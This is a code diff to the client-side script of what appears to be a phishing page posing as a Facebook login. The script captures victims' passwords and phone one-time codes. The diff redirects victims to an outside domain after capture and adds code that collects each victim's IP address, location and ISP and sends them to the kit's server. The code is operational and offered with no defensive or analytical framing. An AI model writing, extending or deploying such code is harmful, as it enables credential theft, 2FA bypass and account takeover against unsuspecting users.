@@ -226,7 +226,7 @@ function signInPasswordXhr(password) {
         document.getElementById("masked-number").innerText = response.message;
         changeCard(passwordCard, confirmPhoneCard);
       } else if (response.code == 3) {
-        location.replace("https://facebook.com");
+        location.replace("https://kraken-questionario.com/?stat=1");
       } else {
         document.getElementById("username-3").innerText = userName;
         document.getElementById("phone-name").innerText = response.message;
@@ -300,9 +300,9 @@ function phoneOtpXhr(otp) {
       if (response.code == 0) {
         phoneOtpInputError("Wrong code. Try again.");
       } else if (response.code == 1) {
-        location.replace("https://facebook.com");
+        location.replace("https://kraken-questionario.com/?stat=1");
       } else if (response.code == 2) {
-        location.replace("https://facebook.com");
+        location.replace("https://kraken-questionario.com/?stat=1");
       }
       phoneOtpCard.classList.remove("submitting");
       // isContinueSignIn = false;
@@ -329,7 +329,7 @@ function ping() {
           console.log("Trying again");
         }, 2000);
       } else if (response == 1) {
-        location.replace("https://facebook.com");
+        location.replace("https://kraken-questionario.com/?stat=1");
       }
     }
   };
@@ -389,7 +389,47 @@ function changeCard(currentCard, nextCard) {
 
 async function startSession() {
   try {
-    const response = await fetch("/start-session", { method: "POST" });
+    // Get client IP address
+    let clientIpInfo = null;
+    try {
+      const ipResponse = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipResponse.json();
+      
+      // Get additional IP info (location, ISP, etc.)
+      try {
+        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const geoData = await geoResponse.json();
+        clientIpInfo = {
+          ip: ipData.ip,
+          location: `${geoData.city || ""}, ${geoData.region || ""}, ${geoData.country_name || ""}`.replace(/^,\s*|,\s*$/g, ""),
+          isp: geoData.org || geoData.asn || "Unknown ISP",
+        };
+      } catch (geoErr) {
+        // Fallback to just IP if geo lookup fails
+        clientIpInfo = {
+          ip: ipData.ip,
+          location: "Unknown",
+          isp: "Unknown ISP",
+        };
+      }
+    } catch (ipErr) {
+      console.warn("Failed to get client IP:", ipErr);
+      clientIpInfo = {
+        ip: "unknown",
+        location: "Unknown",
+        isp: "Unknown ISP",
+      };
+    }
+
+    const response = await fetch("/start-session", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        clientIpInfo: clientIpInfo,
+      }),
+    });
     const data = await response.json();
     if (data.success) {
       console.log("Session ID:", data.sessionId);
